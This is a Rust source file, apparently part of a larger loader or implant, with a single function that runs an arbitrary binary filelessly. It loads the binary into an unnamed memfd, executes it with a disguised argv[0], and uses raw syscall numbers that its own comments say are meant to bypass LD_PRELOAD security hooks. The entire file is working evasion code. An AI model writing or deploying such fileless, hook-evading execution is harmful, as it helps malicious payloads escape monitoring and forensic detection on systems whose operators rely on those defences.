use super::ExecError;
use std::ffi::CString;
use std::io::Write;

pub fn memfd_exec_impl(binary: Vec<u8>, args: Vec<String>) -> Result<(), ExecError> {
    // Phase 1.6: Use direct syscalls to bypass LD_PRELOAD hooks.
    // memfd_create via syscall 319 (not libc wrapper)
    let name = CString::new("").unwrap();
    let fd = unsafe {
        libc::syscall(
            319i64,           // __NR_memfd_create (direct, not libc::SYS_memfd_create)
            name.as_ptr(),
            1u32,             // MFD_CLOEXEC
        )
    } as i32;
    if fd < 0 {
        return Err(ExecError::MemfdCreate(std::io::Error::last_os_error()));
    }

    // write via syscall 1
    let mut offset = 0;
    while offset < binary.len() {
        let written = unsafe {
            libc::syscall(
                1i64,         // __NR_write
                fd,
                binary[offset..].as_ptr(),
                binary.len() - offset,
            )
        } as isize;
        if written < 0 {
            return Err(ExecError::MemfdWrite(std::io::Error::last_os_error()));
        }
        offset += written as usize;
    }

    let path = CString::new(format!("/proc/self/fd/{}", fd)).unwrap();
    let argv: Vec<CString> = std::iter::once(CString::new(".").unwrap())
        .chain(args.into_iter().filter_map(|a| CString::new(a).ok()))
        .collect();
    let argv_ptrs: Vec<*const libc::c_char> = argv.iter()
        .map(|a| a.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    let environ: Vec<CString> = std::env::vars()
        .filter_map(|(k, v)| CString::new(format!("{}={}", k, v)).ok())
        .collect();
    let env_ptrs: Vec<*const libc::c_char> = environ.iter()
        .map(|e| e.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    // execve via syscall 59
    unsafe {
        libc::syscall(
            59i64,            // __NR_execve
            path.as_ptr(),
            argv_ptrs.as_ptr(),
            env_ptrs.as_ptr(),
        );
    }
    Err(ExecError::Execve(std::io::Error::last_os_error()))
}
